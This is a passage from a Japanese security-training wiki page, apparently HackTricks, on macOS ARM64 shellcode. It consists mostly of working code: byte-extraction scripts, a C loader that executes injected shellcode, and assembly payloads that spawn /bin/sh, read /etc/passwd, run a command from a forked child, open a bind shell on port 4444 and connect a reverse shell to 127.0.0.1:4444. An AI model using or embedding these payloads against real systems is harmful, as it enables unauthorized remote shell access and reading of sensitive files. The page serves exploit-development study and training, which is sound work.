# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
新しいmacOSの場合：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>シェルコードをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から取得し、説明されています。

{{#tabs}}
{{#tab name="adrを使用"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### catで読む

目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することであり、第二引数（x1）はパラメータの配列です（これはメモリ内ではアドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### フォークからshでコマンドを呼び出すことで、メインプロセスが終了しないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### バインドシェル

**ポート 4444** での [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) からのバインドシェル
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### リバースシェル

From [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
